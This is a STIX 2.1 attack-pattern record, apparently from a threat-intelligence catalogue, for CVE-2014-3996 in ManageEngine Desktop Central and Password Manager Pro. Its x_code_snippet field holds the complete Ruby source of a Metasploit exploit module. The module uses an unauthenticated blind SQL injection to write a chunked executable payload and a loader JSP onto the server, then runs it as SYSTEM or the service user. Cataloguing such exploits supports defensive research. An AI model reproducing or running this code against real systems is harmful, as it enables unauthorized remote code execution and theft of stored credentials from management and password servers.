{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1173d5c7-af34-402f-a977-2ee626420112",
    "created": "2024-08-14T17:11:12.976975Z",
    "modified": "2024-08-14T17:11:12.976979Z",
    "name": "\"ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection\"",
    "description": " This module exploits an unauthenticated blind SQL injection in LinkViewFetchServlet which is exposed in ManageEngine Desktop Central v7 build 70200 to v9 build 90033 and Password Manager Pro v6 build 6500 to v7 build 7002 (including the MSP versions). The SQL injection can be used to achieve remote code execution as SYSTEM in Windows or as the user in Linux. This module exploits both PostgreSQL (newer builds) and MySQL (older or upgraded builds). MySQL targets are more reliable due to the use of relative paths; with PostgreSQL you should find the web root path via other means and specify it with WEB_ROOT.  The injection is only exploitable via a GET request, which means that the payload",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/manage_engine_dc_pmp_sqli.rb",
            "external_id": "manage_engine_dc_pmp_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-3996"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2014/Aug/55"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection\",\n      'Description'    => %q{\n        This module exploits an unauthenticated blind SQL injection in LinkViewFetchServlet,\n        which is exposed in ManageEngine Desktop Central v7 build 70200 to v9 build 90033 and\n        Password Manager Pro v6 build 6500 to v7 build 7002 (including the MSP versions). The\n        SQL injection can be used to achieve remote code execution as SYSTEM in Windows or as\n        the user in Linux. This module exploits both PostgreSQL (newer builds) and MySQL (older\n        or upgraded builds). MySQL targets are more reliable due to the use of relative paths;\n        with PostgreSQL you should find the web root path via other means and specify it with\n        WEB_ROOT.\n\n        The injection is only exploitable via a GET request, which means that the payload\n        has to be sent in chunks smaller than 8000 characters (URL size limitation). Small\n        payloads and the use of exe-small is recommended, as you can only do between 10 and\n        20 injections before using up all the available ManagedConnections until the next\n        server restart.\n\n        This vulnerability exists in all versions released since 2006, however builds below\n        DC v7 70200 and PMP v6 6500 do not ship with a JSP compiler. You can still try your\n        luck using the MySQL targets as a JDK might be installed in the $PATH.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>'  # Vulnerability discovery and MSF module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2014-3996' ],\n          [ 'OSVDB', '110198' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Aug/55' ]\n        ],\n      'Arch'           => ARCH_X86,\n      'Platform'       => %w{ linux win },\n      'Targets'        =>\n        [\n          [  'Automatic', {}  ],\n          [  'Desktop Central v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows',\n            {\n              'WebRoot' => 'C:\\\\ManageEngine\\\\DesktopCentral_Server\\\\webapps\\\\DesktopCentral\\\\',\n              'Database' => 'postgresql',\n              'Platform' => 'win'\n            }\n          ],\n          [  'Desktop Central MSP v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows',\n            {\n              'WebRoot' => 'C:\\\\ManageEngine\\\\DesktopCentralMSP_Server\\\\webapps\\\\DesktopCentral\\\\',\n              'Database' => 'postgresql',\n              'Platform' => 'win'\n            }\n          ],\n          [  'Desktop Central [MSP] v7 >= b70200 / v8 / v9 < b90039 (MySQL) on Windows',\n            {\n              'WebRoot' => '../../webapps/DesktopCentral/',\n              'Database' => 'mysql',\n              'Platform' => 'win'\n            }\n          ],\n          [  'Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Windows',\n            {\n              'WebRoot' => 'C:\\\\ManageEngine\\\\PMP\\\\webapps\\\\PassTrix\\\\',\n              'Database' => 'postgresql',\n              'Platform' => 'win'\n            }\n          ],\n          [  'Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Windows',\n            {\n              'WebRoot' => '../../webapps/PassTrix/',\n              'Database' => 'mysql',\n              'Platform' => 'win'\n            }\n          ],\n          [  'Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Linux',\n            {\n              'WebRoot' => '/opt/ManageEngine/PMP/webapps/PassTrix/',\n              'Database' => 'postgresql',\n              'Platform' => 'linux'\n            }\n          ],\n          [  'Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Linux',\n            {\n              'WebRoot' => '../../webapps/PassTrix/',\n              'Database' => 'mysql',\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => false,            # Privileged on Windows but not on Linux targets\n      'DisclosureDate' => '2014-06-08'))\n\n    register_options(\n      [\n        OptPort.new('RPORT',\n          [true, 'The target port', 8020]),\n        OptString.new('WEB_ROOT',\n          [false, 'Slash terminated web server root filepath (escape Windows paths with 4 slashes \\\\\\\\\\\\\\\\)'])\n      ])\n\n    register_advanced_options(\n      [\n        OptInt.new('CHUNK_SIZE',\n          [true, 'Number of characters to send per request (< 7800)', 7500]),\n        OptInt.new('SLEEP',\n          [true, 'Seconds to sleep between injections (x1 for MySQL, x2.5 for PostgreSQL)', 2]),\n        OptBool.new('EXE_SMALL',\n          [true, 'Use exe-small encoding for better reliability', true]),\n      ])\n\n  end\n\n  def check\n    check_code = check_desktop_central\n\n    if check_code == Exploit::CheckCode::Unknown\n      check_code = check_password_manager_pro\n    end\n\n    check_code\n  end\n\n  def exploit\n    @my_target = pick_target\n    if @my_target.nil?\n      fail_with(Failure::NoTarget, \"#{peer} - Automatic targeting failed\")\n    else\n      print_status(\"Selected target #{@my_target.name}\")\n    end\n\n    # When using auto targeting, MSF selects the Windows meterpreter as the default payload.\n    # Fail if this is the case to avoid polluting the web root any more.\n    if @my_target['Platform'] == 'linux' && payload_instance.name =~ /windows/i\n      fail_with(Failure::BadConfig, \"#{peer} - Select a compatible payload for this Linux target.\")\n    end\n\n    if datastore['WEB_ROOT']\n      web_root = datastore['WEB_ROOT']\n    else\n      web_root = @my_target['WebRoot']\n    end\n\n    jsp_name  = rand_text_alpha_lower(8) + \".jsp\"\n    fullpath = web_root + jsp_name\n    inject_exec(fullpath)\n    register_file_for_cleanup(fullpath.sub('../',''))\n\n    print_status(\"Requesting #{jsp_name}\")\n    send_request_raw({'uri' => normalize_uri(jsp_name)})\n  end\n\n  # Test for Password Manager Pro\n  def password_manager_paths\n    db_paths = {}\n\n    res = send_request_cgi({\n                               'uri' => normalize_uri(\"PassTrixMain.cc\"),\n                               'method' => 'GET'\n                           })\n\n    if res && res.code == 200 && res.body.to_s =~ /ManageEngine Password Manager Pro/\n      if datastore['WEB_ROOT']\n        db_paths[:postgresql] = datastore['WEB_ROOT'].dup\n        db_paths[:mysql] = datastore['WEB_ROOT'].dup\n      else\n        db_paths[:postgresql] = targets[4]['WebRoot'].dup\n        db_paths[:mysql] = targets[5]['WebRoot'].dup\n      end\n    end\n\n    db_paths\n  end\n\n  # Test for Desktop Central\n  def desktop_central_db_paths\n    db_paths = {}\n    res = send_request_cgi({\n                               'uri' => normalize_uri(\"configurations.do\"),\n                               'method' => 'GET'\n                           })\n\n    if res && res.code == 200 && res.body.to_s =~ /ManageEngine Desktop Central/\n      if datastore['WEB_ROOT']\n        db_paths[:postgresql] = datastore['WEB_ROOT'].dup\n        db_paths[:mysql] = datastore['WEB_ROOT'].dup\n      elsif res.body.to_s =~ /ManageEngine Desktop Central MSP/\n        db_paths[:postgresql] = targets[2]['WebRoot'].dup\n        db_paths[:mysql] = targets[3]['WebRoot'].dup\n      else\n        db_paths[:postgresql] = targets[1]['WebRoot'].dup\n        db_paths[:mysql] = targets[3]['WebRoot'].dup\n      end\n    end\n\n    db_paths\n  end\n\n  def db_paths\n    paths = desktop_central_db_paths\n\n    if paths.empty?\n      paths = password_manager_paths\n    end\n\n    paths\n  end\n\n  def pick_mysql_target(mysql_path, rand_txt)\n    file_path = mysql_path << rand_txt\n\n    # @@version_compile_os will give us Win32 / Win64 if it's a Windows target\n    inject_sql(\"select @@version_compile_os into dumpfile '#{file_path}'\", \"mysql\")\n\n    res = send_request_cgi({\n                               'uri' => normalize_uri(rand_txt),\n                               'method' => 'GET'\n                           })\n\n    if res && res.code == 200\n      register_file_for_cleanup(file_path.sub('../',''))\n      if res.body.to_s =~ /Win32/ or res.body.to_s =~ /Win64/\n        if mysql_path =~ /DesktopCentral/\n          # Desktop Central [MSP] / MySQL / Windows\n          return targets[3]\n        else\n          # Password Manager Pro / MySQL / Windows\n          return targets[5]\n        end\n      else\n        # Password Manager Pro / MySQL / Linux\n        return targets[7]\n      end\n    end\n\n    nil\n  end\n\n  def pick_postgres_target(postgresql_path, rand_txt)\n    file_path = postgresql_path << rand_txt\n\n    # version() will tell us if it's compiled by Visual C++ (Windows) or gcc (Linux)\n    inject_sql(\"copy (select version()) to '#{file_path}'\", \"postgresql\")\n\n    res = send_request_cgi({\n                               'uri' => normalize_uri(rand_txt),\n                               'method' => 'GET'\n                           })\n\n    if res && res.code == 200\n      register_file_for_cleanup(file_path)\n      if res.body.to_s =~ /Visual C++/\n        if postgresql_path =~ /DesktopCentral_Server/\n          # Desktop Central / PostgreSQL / Windows\n          return targets[1]\n        elsif postgresql_path =~ /DesktopCentralMSP_Server/\n          # Desktop Central MSP / PostgreSQL / Windows\n          return targets[2]\n        else\n          # Password Manager Pro / PostgreSQL / Windows\n          return targets[4]\n        end\n      elsif res.body.to_s =~ /linux/\n        # This is for the case when WEB_ROOT is provided\n        # Password Manager Pro / PostgreSQL / Linux\n        return targets[6]\n      end\n    end\n\n    # OK, it's Password Manager Pro on Linux, probably using PostgreSQL and\n    # no WEB_ROOT was provided. Let's try one of the defaults before bailing out.\n    file_path = targets[5]['WebRoot'].dup << rand_txt\n    inject_sql(\"copy (select version()) to '#{file_path}'\", \"postgresql\")\n\n    res = send_request_cgi({\n                               'uri' => normalize_uri(rand_txt),\n                               'method' => 'GET'\n                           })\n\n    if res && res.code == 200 && res.body.to_s =~ /linux/\n      # Password Manager Pro / PostgreSQL / Linux\n      return targets[6]\n    end\n\n    nil\n  end\n\n  def pick_target\n    return target if target.name != 'Automatic'\n\n    print_status(\"Selecting target, this might take a few seconds...\")\n    rand_txt = rand_text_alpha_lower(8) << \".txt\"\n\n    paths = db_paths\n\n    if paths.empty?\n      # We don't know what this is, bail\n      return nil\n    end\n\n    postgresql_path = paths[:postgresql]\n    mysql_path = paths[:mysql]\n\n    # try MySQL first, there are probably more of these out there\n    mysql_target = pick_mysql_target(mysql_path, rand_txt)\n\n    unless mysql_target.nil?\n      return mysql_target\n    end\n\n    # didn't work, let's try PostgreSQL\n    postgresql_target = pick_postgres_target(postgresql_path, rand_txt)\n\n    postgresql_target\n  end\n\n  #\n  # Creates the JSP that will assemble the payload on the server\n  #\n  def generate_jsp_encoded(files)\n    native_payload_name = rand_text_alpha(rand(6)+3)\n    ext = (@my_target['Platform'] == 'win') ? '.exe' : '.bin'\n\n    var_raw     = rand_text_alpha(rand(8) + 3)\n    var_ostream = rand_text_alpha(rand(8) + 3)\n    var_buf     = rand_text_alpha(rand(8) + 3)\n    var_decoder = rand_text_alpha(rand(8) + 3)\n    var_tmp     = rand_text_alpha(rand(8) + 3)\n    var_path    = rand_text_alpha(rand(8) + 3)\n    var_proc2   = rand_text_alpha(rand(8) + 3)\n    var_files   = rand_text_alpha(rand(8) + 3)\n    var_ch      = rand_text_alpha(rand(8) + 3)\n    var_istream = rand_text_alpha(rand(8) + 3)\n    var_file    = rand_text_alpha(rand(8) + 3)\n\n    files_decl = \"{ \"\n    files.each { |file|  files_decl << \"\\\"#{file}\\\",\" }\n    files_decl[-1] = \"}\"\n\n    if @my_target['Platform'] == 'linux'\n      var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3)\n      chmod = %Q|\n      Process #{var_proc1} = Runtime.getRuntime().exec(\"chmod 777 \" + #{var_path});\n      Thread.sleep(200);\n      |\n\n      var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3)\n      cleanup = %Q|\n      Thread.sleep(200);\n      Process #{var_proc3} = Runtime.getRuntime().exec(\"rm \" + #{var_path});\n      |\n    else\n      chmod = ''\n      cleanup = ''\n    end\n\n    jsp = %Q|\n    <%@page import=\"java.io.*\"%>\n    <%@page import=\"sun.misc.BASE64Decoder\"%>\n    <%\n    String[] #{var_files} = #{files_decl};\n    try {\n      int #{var_ch};\n      StringBuilder #{var_buf} = new StringBuilder();\n      for (String #{var_file} : #{var_files}) {\n        BufferedInputStream #{var_istream} =\n          new BufferedInputStream(new FileInputStream(#{var_file}));\n        while((#{var_ch} = #{var_istream}.read())!= -1)\n          #{var_buf}.append((char)#{var_ch});\n        #{var_istream}.close();\n      }\n\n      BASE64Decoder #{var_decoder} = new BASE64Decoder();\n      byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());\n\n      File #{var_tmp} = File.createTempFile(\"#{native_payload_name}\", \"#{ext}\");\n      String #{var_path} = #{var_tmp}.getAbsolutePath();\n\n      BufferedOutputStream #{var_ostream} =\n        new BufferedOutputStream(new FileOutputStream(#{var_path}));\n      #{var_ostream}.write(#{var_raw});\n      #{var_ostream}.close();\n      #{chmod}\n      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});\n      #{cleanup}\n    } catch (Exception e) {\n    }\n    %>\n    |\n\n    jsp = jsp.gsub(/\\n/, '')\n    jsp = jsp.gsub(/\\t/, '')\n\n    if @my_target['Database'] == 'postgresql'\n      # Ruby's base64 encoding adds newlines at every 60 chars, strip them\n      [jsp].pack(\"m*\").gsub(/\\n/, '')\n    else\n      # Assuming mysql, applying hex encoding instead\n      jsp.unpack(\"H*\")[0]\n    end\n  end\n\n\n  def inject_sql(sqli_command, target = nil)\n    target = (target == nil) ? @my_target['Database'] : target\n    if target == 'postgresql'\n      sqli_prefix = \"viewname\\\";\"\n      sqli_suffix = \";-- \"\n    else\n      # Assuming mysql\n      sqli_prefix = \"viewname\\\" union \"\n      sqli_suffix = \"#\"\n    end\n\n    send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(\"LinkViewFetchServlet.dat\"),\n      'vars_get'  => {\n        'sv'    => sqli_prefix << sqli_command << sqli_suffix\n      }\n    })\n\n    if target == 'postgresql'\n      # PostgreSQL sometimes takes a while to write to the disk, so sleep more\n      sleep(datastore['SLEEP'] * 2.5)\n    else\n      # Assuming mysql\n      sleep(datastore['SLEEP'])\n    end\n   end\n\n  # Generate the actual payload\n  def generate_exe_payload\n    opts = {:arch => @my_target.arch, :platform => @my_target.platform}\n    payload = exploit_regenerate_payload(@my_target.platform, @my_target.arch)\n    if datastore['EXE_SMALL'] and @my_target['Platform'] == 'win'\n      exe = Msf::Util::EXE.to_executable_fmt(framework, arch, platform,\n        payload.encoded, \"exe-small\", opts)\n    else\n      exe = generate_payload_exe(opts)\n    end\n    Rex::Text.encode_base64(exe)\n  end\n\n  # Uploads the payload in chunks\n  def inject_exec(fullpath)\n    base64_exe = generate_exe_payload\n    base64_exe_len = base64_exe.length\n\n    # We will be injecting in CHUNK_SIZE steps\n    chunk_size = datastore['CHUNK_SIZE']\n    copied = 0\n    counter = 0\n    if base64_exe_len < chunk_size\n      chunk_size = base64_exe_len\n    end\n    chunks = (base64_exe_len.to_f / chunk_size).ceil\n    time = chunks * datastore['SLEEP'] *\n     ((@my_target['Database'] == 'postgresql') ? 2.5 : 1)\n\n    # We dump our files in either C:\\Windows\\system32 or /tmp\n    # It's not very clean, but when using a MySQL target we have no other choice\n    # as we are using relative paths for injection.\n    # The Windows path has to be escaped with 4 backslashes because ruby eats one\n    # and the JSP eats the other.\n    files = Array.new(chunks)\n    files.map! do |file|\n      if @my_target['Platform'] == 'win'\n        file = \"C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\\" + rand_text_alpha(rand(8)+3)\n      else\n        # Assuming Linux, let's hope we can write to /tmp\n        file = \"/tmp/\" + rand_text_alpha(rand(8)+3)\n      end\n    end\n\n    print_status(\"Payload size is #{base64_exe_len}, injecting #{chunks} chunks in #{time} seconds\")\n\n    if @my_target['Database'] == 'postgresql'\n      inject_sql(\"copy (select '#{base64_exe[copied,chunk_size]}') to '#{files[counter]}'\")\n    else\n      # Assuming mysql\n      inject_sql(\"select '#{base64_exe[copied,chunk_size]}' from mysql.user into dumpfile '#{files[counter]}'\")\n    end\n    register_file_for_cleanup(files[counter])\n    copied += chunk_size\n    counter += 1\n\n    while copied < base64_exe_len\n      if (copied + chunk_size) > base64_exe_len\n        # Last loop\n        chunk_size = base64_exe_len - copied\n      end\n      if @my_target['Database'] == 'postgresql'\n        inject_sql(\"copy (select '#{base64_exe[copied,chunk_size]}') to '#{files[counter]}'\")\n      else\n        # Assuming mysql\n        inject_sql(\"select '#{base64_exe[copied,chunk_size]}' from mysql.user into dumpfile '#{files[counter]}'\")\n      end\n      register_file_for_cleanup(files[counter])\n      copied += chunk_size\n      counter += 1\n    end\n\n    jsp_encoded = generate_jsp_encoded(files)\n    if @my_target['Database'] == 'postgresql'\n      inject_sql(\"copy (select convert_from(decode('#{jsp_encoded}','base64'),'utf8')) to '#{fullpath}'\")\n    else\n      inject_sql(\"select 0x#{jsp_encoded} from mysql.user into dumpfile '#{fullpath}'\")\n    end\n  end\n\n  def check_desktop_central_8(body)\n    if body =~ /id=\"buildNum\" value=\"([0-9]+)\"\\/>/\n      build = $1\n      if ver_gt(build, '80200')\n        print_status(\"Detected Desktop Central v8 #{build}\")\n      else\n        print_status(\"Detected Desktop Central v8 #{build} (MySQL)\")\n      end\n    else\n      print_status(\"Detected Desktop Central v8 (MySQL)\")\n    end\n    # DC v8 < 80200 uses the MySQL database\n    Exploit::CheckCode::Appears\n  end\n\n  def check_desktop_central_9(body)\n    if body =~ /id=\"buildNum\" value=\"([0-9]+)\"\\/>/\n      build = $1\n      print_status(\"Detected Desktop Central v9 #{build}\")\n      if ver_lt(build, '90039')\n        return Exploit::CheckCode::Appears\n      else\n        return Exploit::CheckCode::Safe\n      end\n    end\n  end\n\n  # Test for Desktop Central\n  def check_desktop_central\n    res = send_request_cgi({\n                               'uri' => normalize_uri(\"configurations.do\"),\n                               'method' => 'GET'\n                           })\n\n    unless res && res.code == 200\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.body.to_s =~ /ManageEngine Desktop Central 7/ ||\n        res.body.to_s =~ /ManageEngine Desktop Central MSP 7/\n      # DC v7 uses the MySQL database\n      print_status(\"Detected Desktop Central v7 (MySQL)\")\n      return Exploit::CheckCode::Appears\n    elsif res.body.to_s =~ /ManageEngine Desktop Central 8/ ||\n        res.body.to_s =~ /ManageEngine Desktop Central MSP 8/\n      return check_desktop_central_8(res.body.to_s)\n    elsif res.body.to_s =~ /ManageEngine Desktop Central 9/ ||\n        res.body.to_s =~ /ManageEngine Desktop Central MSP 9/\n      return check_desktop_central_9(res.body.to_s)\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  # Test for Password Manager Pro\n  def check_password_manager_pro\n    res = send_request_cgi({\n                               'uri' => normalize_uri(\"PassTrixMain.cc\"),\n                               'method' => 'GET'\n                           })\n\n    if res && res.code == 200 &&\n        res.body.to_s =~ /ManageEngine Password Manager Pro/ &&\n        (\n          res.body.to_s =~ /login\\.css\\?([0-9]+)/ ||                            # PMP v6\n          res.body.to_s =~ /login\\.css\\?version=([0-9]+)/ ||                    # PMP v6\n          res.body.to_s =~ /\\/themes\\/passtrix\\/V([0-9]+)\\/styles\\/login\\.css\"/ # PMP v7\n        )\n      build = $1\n    else\n      return Exploit::CheckCode::Unknown\n    end\n\n\n    if ver_lt_eq(build, '6500')\n      # if it's a build below 6500, it will only work if we have a JSP compiler\n      print_status(\"Detected Password Manager Pro v6 #{build} (needs a JSP compiler)\")\n      return Exploit::CheckCode::Detected\n    elsif ver_lt(build, '6800')\n      # PMP v6 < 6800 uses the MySQL database\n      print_status(\"Detected Password Manager Pro v6 #{build} (MySQL)\")\n      return Exploit::CheckCode::Appears\n    elsif ver_lt(build, '7003')\n      print_status(\"Detected Password Manager Pro v6 / v7 #{build}\")\n      return Exploit::CheckCode::Appears\n    else\n      print_status(\"Detected Password Manager Pro v6 / v7 #{build}\")\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def ver_lt(a, b)\n    Rex::Version.new(a) < Rex::Version.new(b)\n  end\n\n  def ver_lt_eq(a, b)\n    Rex::Version.new(a) <= Rex::Version.new(b)\n  end\n\n  def ver_gt_eq(a, b)\n    Rex::Version.new(a) >= Rex::Version.new(b)\n  end\n\n  def ver_gt(a, b)\n    Rex::Version.new(a) > Rex::Version.new(b)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-06-08",
    "x_mitre_platforms": [
        "linux"
    ]
}